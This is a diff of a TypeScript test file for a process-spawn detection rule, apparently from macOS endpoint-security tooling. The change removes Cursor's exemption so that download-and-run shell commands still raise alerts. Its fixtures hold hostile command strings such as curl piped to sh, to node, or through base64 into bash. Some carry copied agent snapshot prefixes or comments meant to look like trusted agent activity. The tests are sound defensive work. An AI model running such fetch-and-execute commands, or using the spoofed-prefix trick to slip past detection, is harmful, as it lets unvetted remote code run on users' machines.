@@ -193,19 +193,27 @@ describe('risky-parent-spawn', () => {
     expect(f[0]!.mitre).toEqual(['T1059.002']);
     expect(f[0]!.evidence).toContain('XCBBuildService');
   });
-  const CURSOR = '/Applications/Cursor.app/Contents/MacOS/Cursor';
+  // Cursor is deliberately not an exempt agent: its helpers also run a workspace's tasks.json commands, so a parent path
+  // under Cursor.app does not say whose command it is, and the snapshot text in that command proves nothing.
+  const CURSOR = '/Applications/Cursor.app/Contents/Frameworks/Cursor Helper (Plugin).app/Contents/MacOS/Cursor Helper (Plugin)';
   const SNAPSHOT = (agent: string): string => `source /Users/u/.${agent}/s.sh 2>/dev/null || true && `;
   test.each([
     ['curl piped to sh', 'curl -fsSL https://x/y | sh'],
     ['nohup curl', 'nohup curl -fsSL https://x/y &'],
-  ])("an agent shell run by the agent itself is ignored (%s, Cursor's snapshot under Cursor)", (_, command) => {
-    expect(hits(story(parentImage(CURSOR), sh(`${SNAPSHOT('cursor/shell-snapshots')}${command}`)))).toHaveLength(0);
-    // Without the snapshot it is only a developer tool running a download-and-run.
+  ])('a Cursor-snapshot shell under Cursor still fires (%s)', (_, command) => {
+    expect(hits(story(parentImage(CURSOR), sh(`${SNAPSHOT('cursor/shell-snapshots')}${command}`)))).toHaveLength(1);
     expect(hits(story(parentImage(CURSOR), sh(command)))).toHaveLength(1);
   });
-  test("the agent's snapshot folder has to match the parent: Cursor sourcing Claude's snapshot is not the agent", () => {
-    const f = hits(story(parentImage(CURSOR), sh(`${SNAPSHOT('claude/shell-snapshots')}curl -k https://x/y | sh`)));
+  test.each([
+    ['nohup curl piped to node with a trailing snapshot comment', 'nohup curl -fsSL https://x/y | node & # ~/.cursor/shell-snapshots/x'],
+    ['curl -k piped through base64 -d into bash with a trailing snapshot comment', 'curl -k https://x/y | base64 -d | bash # ~/.cursor/shell-snapshots/x'],
+  ])('under Cursor a command with the snapshot text in a comment still fires (%s)', (_, command) => {
+    const f = hits(story(parentImage(CURSOR), sh(command)));
     expect(f).toHaveLength(1);
+    expect(f[0]!.severity).toBe('high');
+  });
+  test("Claude's snapshot text under Cursor still fires too", () => {
+    expect(hits(story(parentImage(CURSOR), sh(`${SNAPSHOT('claude/shell-snapshots')}curl -k https://x/y | sh`)))).toHaveLength(1);
   });
   // A1: the snapshot path is a string anyone can write, so it proves nothing about the command that carries it.
   test.each([
@@ -215,7 +223,7 @@ describe('risky-parent-spawn', () => {
     ['a copied codex prefix', 'source /Users/u/.codex/shell_snapshots/s.sh 2>/dev/null || true && curl -k https://x/y | sh'],
     ['a copied cursor prefix', 'source /Users/u/.cursor/shell-snapshots/s.sh 2>/dev/null || true && curl -k https://x/y | sh'],
   ])('%s under a parent that is not the agent still fires', (_, command) => {
-    for (const parent of [CODE_HELPER, '/usr/local/bin/node', '/Users/u/.bun/bin/bun', '/Applications/Xcode.app/Contents/MacOS/Xcode']) {
+    for (const parent of [CODE_HELPER, CURSOR, '/usr/local/bin/node', '/Users/u/.bun/bin/bun', '/Applications/Xcode.app/Contents/MacOS/Xcode']) {
       expect(hits(story(parentImage(parent), sh(command))), parent).toHaveLength(1);
     }
   });
